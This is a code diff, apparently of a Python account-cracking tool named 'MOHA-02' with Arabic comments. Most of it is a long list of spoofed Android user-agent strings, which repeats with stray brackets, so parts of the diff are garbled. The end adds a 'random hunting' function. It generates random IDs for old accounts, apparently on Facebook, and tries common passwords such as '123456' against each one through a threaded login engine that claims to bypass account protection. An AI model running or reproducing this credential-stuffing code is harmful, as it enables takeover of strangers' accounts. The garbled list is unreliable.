+    "Mozilla/5.0 (Linux; Android 12; SM-A525U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-A536U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-A546U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-A715U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-A725U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-A736U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-M105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-M115F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-M127F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-M205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-M215F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-M305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-M325F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-M405F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-M426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-M515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-M526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-M625F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-E025F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-E127F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-E225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-E305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-E426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-E526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-E625F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+]
+    "Mozilla/5.0 (Linux; Android 14; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-S906B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-G991N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-G996N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-G998N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-G9810) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-G9860) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-G9880) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-G9700) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-G9730) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-G9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-N9810) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-N9860) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-N9700) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-N9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-A515U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-A525U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-A536U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-A546U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-A715U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-A725U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-A736U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-M105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-M115F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-M127F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-M205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-M215F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-M305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-M325F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-M405F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-M426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-M515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-M526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-M625F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-E025F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-E127F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-E225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; SM-E305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-E426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-E526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-E625F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+]
+    "Mozilla/5.0 (Linux; Android 14; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-S906B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-G991N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    # --- [ تكملة المحرك المخصص للحسابات القديمة ] ---
+
+def random_hunt():
+    """نظام صيد الحسابات القديمة المخصص لموحا الشلفاوي"""
+    logo()
+    print(G + " [>] Targeting: 2009 | 2010 | 2011-2014")
+    print(Y + " ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+    
+    try:
+        limit = int(input(G + " [?] Scan Limit: " + W))
+    except: limit = 5000
+    
+    # ايديات قديمة مخصصة للسنوات المطلوبة (تبدأ بـ 100000)
+    prefixes = ['1000000', '1000001', '1000002', '1000003', '1000004', '1000005']
+    
+    with tred(max_workers=35) as pool:
+        for _ in range(limit):
+            prefix = random.choice(prefixes)
+            # توليد ايدي قديم (15 رقم) لضمان الدقة في الصيد
+            uid = prefix + "".join(random.choice("0123456789") for _ in range(8))
+            
+            # كلمات السر التي حددتها (الأكثر شيوعاً للحسابات القديمة)
+            for pw in ['123456', '1234567', '12345678', '123456789']:
+                # استخدام ميثود B المخصصة لتخطي حماية الحسابات القديمة
+                pool.submit(login_engine, uid, pw, 'B')
+
+def main():
+    """الدالة الأساسية لتشغيل MOHA-02 SMART SYSTEM"""
+    play_welcome()  # نظام الترحيب الصوتي
+    open_channel()   # فتح قناتك على تيليجرام
+    while True:
+        logo()
+        print(G + " [1] File Cracker (Custom Passwords)")
+        print(G + " [2] Random Hunting (2009-2014 ONLY)")
+        print(R + " [0] Exit System")
+        
+        choice = input(C + "\n [MOHA-02] Choice >> " + W)
+        
+        if choice == '1':
+            file_crack()
+        elif choice == '2':
+            random_hunt()
+        elif choice == '0':
+            print(Y + "\n [!] Thanks for using Moha Tool. Goodbye!"); sys.exit()
+        else:
+            print(R + " [!] Invalid choice."); time.sleep(1)
+
+# تشغيل النظام باسم المطور موحا الشلفاوي
 if __name__ == "__main__":
     try:
-        main_system()
-    except KeyboardInterrupt:
-        print(R + "\n\n[!] Script Stopped By User.")
-        sys.exit()
+        main()
+    except Exception as e:
+        print(R + f" [!] Fatal Error: {e}")
